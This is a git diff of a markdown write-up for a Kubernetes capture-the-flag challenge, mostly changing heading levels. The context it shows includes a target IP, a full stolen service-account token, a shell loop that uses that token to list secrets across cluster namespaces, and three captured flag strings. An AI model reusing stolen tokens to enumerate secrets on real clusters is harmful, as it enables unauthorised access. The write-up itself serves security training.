@@ -1,11 +1,11 @@
-# Mini Kubernetes
+## Mini Kubernetes
 
 This CTF involves exploiting a Kubernetes misconfigurations to capture 3 flags.
 
-## Tools Used
+### Tools Used
 - `kubectl` - Pre-installed in pod
 
-## Initial Recon
+### Initial Recon
 
 URL: `http://77.42.16.86:30000/`
 
@@ -108,7 +108,7 @@ frontend
 
 ---
 
-## Permissions
+### Permissions
 
 ```bash
 /app/kubectl auth can-i --list
@@ -156,14 +156,10 @@ Using the stolen **backend-sa** token to scan for flag secrets:
 for ns in frontend backend default win-namespace kube-system; do echo "=== Checking $ns for flags==="; curl -sk -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/$ns/secrets 2>/dev/null | grep '"name"' | grep -E "flag|final|win"; done
 ```
 
-**Found:**
+**Result:**
 - `flag1` in frontend namespace
 - `flag2` in backend namespace  
 - `flag3-master-treasure` in win-namespace
-
----
-
-## Capturing the Flags
 
 ### Flag 1: Initial Compromise
 
@@ -173,8 +169,6 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dT
 
 **Flag:** `RE:CTF{initial_compromise_via_rce_success}`
 
----
-
 ### Flag 2: Lateral Movement
 
 ```bash
@@ -183,8 +177,6 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dT
 
 **Flag:** `RE:CTF{lateral_move_to_backend_success}`
 
----
-
 ### Flag 3: Master Treasure
 
 ```bash
@@ -192,7 +184,6 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dT
 ```
 
 **Flag:** `RE:CTF{you_are_k8s_master_congratulations}`
-
 
 **References:**
 - [K8s LAN Party CTF Writeup](https://arnavtripathy98.medium.com/solving-a-kubernetes-ctf-k8s-lan-party-c773190e9246)
